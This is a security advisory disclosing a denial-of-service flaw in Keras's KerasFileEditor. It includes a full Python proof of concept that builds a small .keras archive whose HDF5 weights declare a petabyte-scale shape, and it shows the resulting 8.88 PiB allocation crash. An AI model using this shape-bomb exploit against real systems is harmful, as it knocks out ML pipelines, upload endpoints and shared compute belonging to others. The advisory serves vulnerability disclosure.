summary: "Keras vulnerable to DoS via Malicious .keras Model (HDF5 Shape Bomb Causes Petabyte\
  \ Allocation in KerasFileEditor)\n### Summary\nKeras’s model loader (KerasFileEditor) unsafely\
  \ loads user-supplied .keras model files containing HDF5-based weight files without performing\
  \ any validation on HDF5 dataset metadata. An attacker can craft a .keras archive containing\
  \ a valid model.weights.h5 file whose dataset declares an extremely large shape (e.g. (50_000_000,\
  \ 50_000_000)), but stores only a few bytes. The .keras file remains small (100–400 KB) because\
  \ HDF5 with gzip compression stores minimal data. During model loading, \nKeras executes:\n\
  `python\nresult[key] = value[()]   # loads entire dataset into memory`\nvalue[()] instructs\
  \ h5py to allocate RAM proportional to the dataset’s declared shape – in this case 8.88 PiB\
  \ of memory. This results in: Immediate memory exhaustion Python / TensorFlow crashes Jupyter\
  \ kernel kill System instability Full Denial of Service on any workload that processes untrusted\
  \ .keras models This allows an attacker to crash any environment or pipeline that loads .keras\
  \ models, including MLOps backends, training services, model upload endpoints, or automated\
  \ pipelines.\n### Proof of Concept\n```\n// PoC.py\nimport zipfile\nimport io\nimport h5py\n\
  import numpy as np\nfrom keras.saving import KerasFileEditor\n\n# Create a malicious .keras\
  \ model containing a massive HDF5 shape bomb\ndef create_malicious_keras(path=\"bomb.keras\"\
  ):\n    hdf5_bytes = io.BytesIO()\n\n    # Create an HDF5 file with a huge declared dataset\
  \ shape\n    with h5py.File(hdf5_bytes, \"w\") as f:\n        d = f.create_dataset(\n    \
  \        \"payload\",\n            shape=(50_000_000, 50_000_000),    # Extremely large shape\
  \ → petabytes on load\n            dtype=\"float32\",\n            compression=\"gzip\",\n\
  \            compression_opts=9\n        )\n        # Write minimal data so the file stays\
  \ very small\n        d[0:1, 0:1] = np.zeros((1, 1), dtype=np.float32)\n\n    hdf5_bytes.seek(0)\n\
  \n    # Build a valid .keras archive structure\n    with zipfile.ZipFile(path, \"w\", zipfile.ZIP_DEFLATED)\
  \ as z:\n        z.writestr(\"config.json\", \"{}\")\n        z.writestr(\"metadata.json\"\
  , \"{}\")\n        z.writestr(\"model.weights.h5\", hdf5_bytes.getvalue())\n\n# Generate the\
  \ malicious model file\ncreate_malicious_keras()\n\n# Trigger the DoS vulnerability when Keras\
  \ loads the malicious file\nKerasFileEditor(\"bomb.keras\")\n```\n### Expected Result\n```\n\
  numpy._core._exceptions._ArrayMemoryError:\nUnable to allocate 8.88 PiB for an array with\
  \ shape (50000000, 50000000)\n```\nThis crash occurs before any actual model processing, confirming\
  \ the Denial-of-Service impact.\n### Impact\nThis vulnerability allows an attacker to crash\
  \ any system that loads a malicious `.keras` model file.\n\nThe attacker can:\n\n- Cause immediate\
  \ memory exhaustion (8+ PiB allocation attempts)\n- Crash TensorFlow / Python interpreter\n\
  - Kill Jupyter kernels\n- Break automated model-upload pipelines\n- Crash MLOps servers that\
  \ process user models\n- Deny service to shared GPU/CPU environments\n\nIf a platform allows\
  \ user-uploaded Keras models (training services, inference endpoints, AutoML tools, Kaggle-style\
  \ platforms), this becomes a Remote Denial of Service vector.\nAdditional PoC Evidence (Video\
  \ Demonstration)\nAttached is a real-world proof-of-concept video demonstrating the crash\
  \ and memory exhaustion when loading the malicious .keras model.\n\nPoC Video (Google Drive):\n\
  [PoC Video](https://drive.google.com/file/d/1XAj57epTBWpj93GwHprHvb14WS9wpl5m/view?usp=drivesdk)\n\
  \nFinding: Critical memory-exhaustion flaw triggered by crafted .keras model files\nVector:\
  \ Malicious metadata causing extreme tensor shape inflation\nImpact: A 31 KB model forces\
  \ an 8.88 PiB allocation attempt, immediately killing the process\nAttack Scenario: Remote\
  \ DoS on ML model processing pipelines and cloud inference services\n\nDemonstration:\nThe\
  \ PoC video shows the crash occurring on Google Colab.\nLoading the malicious model consumed\
  \ all system RAM and repeatedly terminated the runtime.\nSeverity is high enough that the\
  \ compute quota dropped from 83 hours → 4 hours after only a few tests.\nWith larger payloads,\
  \ this would instantly exhaust resources in real production pipelines."
